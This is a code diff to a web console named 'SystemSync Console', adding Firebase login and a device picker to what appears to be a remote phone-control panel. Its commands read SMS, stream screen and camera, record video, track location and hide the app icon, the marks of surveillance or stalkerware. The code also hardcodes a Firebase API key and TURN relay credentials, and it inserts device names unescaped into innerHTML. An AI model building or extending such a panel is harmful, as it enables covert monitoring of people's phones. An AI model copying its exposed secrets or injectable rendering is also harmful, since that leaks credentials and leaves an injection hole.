@@ -4,7 +4,7 @@
     <title>SystemSync Console · Reliable</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
-        /* ---------- your existing styles (unchanged) ---------- */
+        /* ---------- YOUR EXISTING STYLES (unchanged) ---------- */
         body{
             margin:0;
             background:#f5f7fa;
@@ -383,10 +383,8 @@
             margin-left: 10px;
         }
 
-      
-        
-          
- /* ---------- MODAL / POPUP STYLES ---------- */
+     
+        /* ---------- MODAL / POPUP STYLES ---------- */
         .modal-overlay{
             position:fixed;
             inset:0;
@@ -424,40 +422,23 @@
         .phone-frame video{
             width:100%;
             height:100%;
-            object-fit:contain;
+            object-fit:cover;
         }
 
-      .popup-controls {
-            flex-shrink: 0;
-            background: #111;
-            padding: 8px;
-            display: flex;
-            gap: 6px;
-            justify-content: space-around;
-            align-items: center;
-            
-            /* ADDED: If the screen is too small for all fixed buttons, 
-               this prevents the layout from breaking by allowing horizontal scrolling */
-            overflow-x: auto; 
+        .popup-controls{
+            flex-shrink:0;
+            background:#111;
+            padding:8px;
+            display:flex;
+            gap:6px;
+            justify-content:space-around;
+            align-items:center;
         }
-
         .popup-controls button {
-            /* 1. LOCK DIMENSIONS EXACTLY */
-            width: 60px;
-            min-width: 60px;
-            max-width: 60px;
-            height: 28px;
-            min-height: 28px;
-            max-height: 28px;
-            
-            /* 2. PREVENT PADDING/BORDERS FROM CHANGING SIZE */
-            box-sizing: border-box;
-            
-            /* 3. ABSOLUTE FLEX OVERRIDE */
-            flex-shrink: 0; 
-            flex-grow: 0;
-            flex-basis: 60px;
-            font-size: 12px;
+            width: 60px;        /* fixed width */
+            height: 28px;       /* fixed height */
+            font-size: 12px;    /* fixed font size */
+            flex: none;         /* prevents flex resizing */
             background: #1e1e1e;
             color: white;
             border: none;
@@ -467,7 +448,7 @@
             align-items: center;
             justify-content: center;
             transition: background 0.15s;
-        }
+  }
         .popup-controls button:hover {
             background: #3a3a3c;
             transform: scale(1.05);
@@ -495,7 +476,7 @@
             filter: blur(4px);
             transition: filter 0.3s;
         }
-
+        
         .ws-debug {
             font-size: 11px;
             color: #666;
@@ -541,10 +522,153 @@
             text-align: right;
             color: #666;
         }
+
+        /* ---------- NEW AUTH STYLES ---------- */
+        #authContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #f5f7fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 20000;
+        }
+        #authBox {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            width: 350px;
+            max-width: 90%;
+        }
+        #authBox h2 {
+            margin-top: 0;
+            color: #1976ff;
+        }
+        #authBox input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+        #authBox button {
+            width: 100%;
+            padding: 10px;
+            background: #1976ff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        #authBox button:hover {
+            background: #0d5bca;
+        }
+        #authError {
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+        #deviceListContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #f5f7fa;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 20000;
+        }
+        #deviceListBox {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            width: 500px;
+            max-width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        #deviceListBox h2 {
+            margin-top: 0;
+            color: #1976ff;
+        }
+        .device-item {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border: 1px solid #e0e4e8;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .device-item:hover {
+            background: #e3f2fd;
+        }
+        .device-icon {
+            font-size: 24px;
+            margin-right: 12px;
+        }
+        .device-info {
+            flex: 1;
+        }
+        .device-name {
+            font-weight: 600;
+            font-size: 16px;
+        }
+        .device-id {
+            font-size: 12px;
+            color: #7b8a9b;
+        }
+        #logoutBtn {
+            margin-top: 16px;
+            background: #d32f2f;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+        }
+        #logoutBtn:hover {
+            background: #b71c1c;
+        }
+        /* Hide main interface initially */
+        #sidebar, #main {
+            display: none;
+        }
     </style>
 </head>
-   
 <body>
+
+<!-- AUTHENTICATION CONTAINER (login) -->
+<div id="authContainer">
+    <div id="authBox">
+        <h2>🔐 SystemSync Login</h2>
+        <input type="email" id="loginEmail" placeholder="Email" />
+        <input type="password" id="loginPassword" placeholder="Password" />
+        <button onclick="login()">Sign In</button>
+        <div id="authError"></div>
+    </div>
+</div>
+
+<!-- DEVICE LIST CONTAINER (shown after login) -->
+<div id="deviceListContainer">
+    <div id="deviceListBox">
+        <h2>📱 Your Devices</h2>
+        <div id="deviceList"></div>
+        <button id="logoutBtn" onclick="logout()">Logout</button>
+    </div>
+</div>
 
 <!-- MODAL OVERLAY (for screen share) -->
 <div id="screenModalOverlay" class="modal-overlay">
@@ -562,7 +686,6 @@
         </div>
     </div>
 </div>
-
 
 <div id="sidebar">
     <div class="logo">SystemSync 🔗</div>
@@ -689,6 +812,21 @@
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
 <script>
+    // ---------- FIREBASE CONFIG ----------
+    const firebaseConfig = {
+        apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
+        authDomain: "webviewiot.firebaseapp.com",
+        databaseURL: "https://webviewiot-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "webviewiot",
+        storageBucket: "webviewiot.firebasestorage.app",
+        messagingSenderId: "634777347775",
+        appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a",
+        measurementId: "G-2KW4EJYTRB"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const db = firebase.firestore();
+
     // ---------- GLOBALS ----------
     const WS_URL = "wss://mirror-view.onrender.com";
     let ws = null;
@@ -701,6 +839,7 @@
     let cameraPC = null;
     let audioPC = null;
     let fileTransfers = {}; // key: transferId, value: { chunks: [], totalChunks, fileName, fileSize, path }
+
     // UI state
     let mapInstance = null;
     let currentData = [];
@@ -710,7 +849,7 @@
     let selectedFiles = [];
     let screenActive = false;
     let iconHidden = false;
-    let flashOn = false; // track flash state
+    let flashOn = false;
 
     // Live camera recording state
     let mediaRecorder = null;
@@ -718,7 +857,7 @@
 
     // Track the last command sent to interpret raw responses
     let pendingCommand = null;
-    let currentDeviceId = null;
+    let selectedDeviceId = null;   // replaces currentDeviceId
 
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
@@ -752,6 +891,76 @@
         { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
     ];
 
+    // ---------- AUTH FUNCTIONS ----------
+    function login() {
+        const email = document.getElementById('loginEmail').value;
+        const password = document.getElementById('loginPassword').value;
+        const errorDiv = document.getElementById('authError');
+        errorDiv.innerText = '';
+
+        auth.signInWithEmailAndPassword(email, password)
+            .then(userCredential => {
+                currentUser = userCredential.user;
+                document.getElementById('authContainer').style.display = 'none';
+                loadDevices();
+            })
+            .catch(error => {
+                errorDiv.innerText = error.message;
+            });
+    }
+
+    function logout() {
+        auth.signOut().then(() => {
+            document.getElementById('deviceListContainer').style.display = 'none';
+            document.getElementById('sidebar').style.display = 'none';
+            document.getElementById('main').style.display = 'none';
+            document.getElementById('authContainer').style.display = 'flex';
+            if (ws) ws.close();
+            selectedDeviceId = null;
+        });
+    }
+
+    function loadDevices() {
+        if (!currentUser) return;
+        db.collection('devices').where('userId', '==', currentUser.uid).get()
+            .then(snapshot => {
+                const deviceList = document.getElementById('deviceList');
+                deviceList.innerHTML = '';
+                if (snapshot.empty) {
+                    deviceList.innerHTML = '<p style="color:#999; text-align:center;">No devices registered.</p>';
+                } else {
+                    snapshot.forEach(doc => {
+                        const device = doc.data();
+                        const div = document.createElement('div');
+                        div.className = 'device-item';
+                        div.onclick = () => selectDevice(device.deviceId, device.name || 'Unknown');
+                        div.innerHTML = `
+                            <span class="device-icon">📱</span>
+                            <div class="device-info">
+                                <div class="device-name">${device.name || 'Unnamed device'}</div>
+                                <div class="device-id">${device.deviceId}</div>
+                            </div>
+                        `;
+                        deviceList.appendChild(div);
+                    });
+                }
+                document.getElementById('deviceListContainer').style.display = 'flex';
+            })
+            .catch(error => {
+                console.error('Error loading devices:', error);
+                alert('Failed to load devices: ' + error.message);
+            });
+    }
+
+    function selectDevice(deviceId, deviceName) {
+        selectedDeviceId = deviceId;
+        document.getElementById('deviceListContainer').style.display = 'none';
+        document.getElementById('sidebar').style.display = 'block';
+        document.getElementById('main').style.display = 'flex';
+        document.getElementById('serverInfo').innerText = `Device: ${deviceName || deviceId}`;
+        connectWebSocket();
+    }
+
     // ---------- SIGNALING OVER WEBSOCKET ----------
     function sendSignalingMessage(msg) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
@@ -760,7 +969,7 @@
         }
         const payload = {
             type: 'SIGNALING',
-            deviceId: currentDeviceId,
+            deviceId: selectedDeviceId,   // use selectedDeviceId
             data: msg
         };
         ws.send(JSON.stringify(payload));
@@ -1099,7 +1308,7 @@
             command: command,
             requestId: requestId,
             params: params,
-            deviceId: currentDeviceId,
+            deviceId: selectedDeviceId,   // use selectedDeviceId
             timestamp: Date.now()
         };
         ws.send(JSON.stringify(payload));
@@ -1123,10 +1332,12 @@
     function handleJSON(json) {
         console.log('handleJSON:', json.type, json);
         
-        if (json.deviceId) {
-            currentDeviceId = json.deviceId;
+        // If we receive a DEVICE_REGISTRATION, we could optionally update the device name in Firestore, but do not change selectedDeviceId
+        if (json.type === 'DEVICE_REGISTRATION') {
+            // Optionally store device info in Firestore (if not already)
+            // But do not change selectedDeviceId
         }
-        
+
         // Handle array responses (from plain text fallback)
         if (Array.isArray(json)) {
             if (pendingCommand === 'GET_SMS') {
@@ -1653,10 +1864,10 @@
                 pendingCommand = null;
                 break;
                 
-            // Device registration
+            // Device registration – we may ignore or update UI
             case 'DEVICE_REGISTRATION':
-                currentDeviceId = json.deviceId;
-                showNotification('Device registered: ' + (json.name || json.deviceId));
+                // Optionally, you could update the device name in Firestore here, but do not change selectedDeviceId
+                console.log('Device registered:', json.deviceId);
                 break;
                 
             // Heartbeat
@@ -1714,7 +1925,6 @@
             pendingCommand = null;
             
         }  else if (msg.startsWith("FLASH_ON")) {
-            // This case may not be used if the device sends JSON, but keep for safety
             flashOn = true;
             document.getElementById('flashBtn').innerText = 'Flash Off';
             showNotification('🔦 Flashlight ON');
@@ -3268,36 +3478,10 @@ function getAppNameFromPkg(pkg) {
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
-    // ---------- INITIALIZE ----------
-    connectWebSocket();
+    // ---------- DO NOT AUTO-CONNECT – waiting for device selection ----------
+    // connectWebSocket();  <-- removed
 </script>
 
-<!-- Firebase config + Firestore initialisation -->
-<script>
-var firebaseConfig = {
-  apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
-  authDomain: "webviewiot.firebaseapp.com",
-  databaseURL: "https://webviewiot-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "webviewiot",
-  storageBucket: "webviewiot.firebasestorage.app",
-  messagingSenderId: "634777347775",
-  appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a",
-  measurementId: "G-2KW4EJYTRB"
-};
-
-try {
-    var _saved = localStorage.getItem('fbConfig');
-    if (_saved) Object.assign(firebaseConfig, JSON.parse(_saved));
-} catch(e) {}
-
-if (firebaseConfig.apiKey && firebaseConfig.apiKey !== 'YOUR_API_KEY') {
-    firebase.initializeApp(firebaseConfig);
-    window.firestoreDb = firebase.firestore();
-    firebase.auth().signInAnonymously().catch(function(e) { console.warn('Firebase auth:', e.message); });
-    console.log('Firebase initialised:', firebaseConfig.projectId);
-} else {
-    console.log('Firebase not configured — using WebSocket only');
-}
-</script>
+<!-- Firebase config (already included in script) -->
 </body>
 </html>
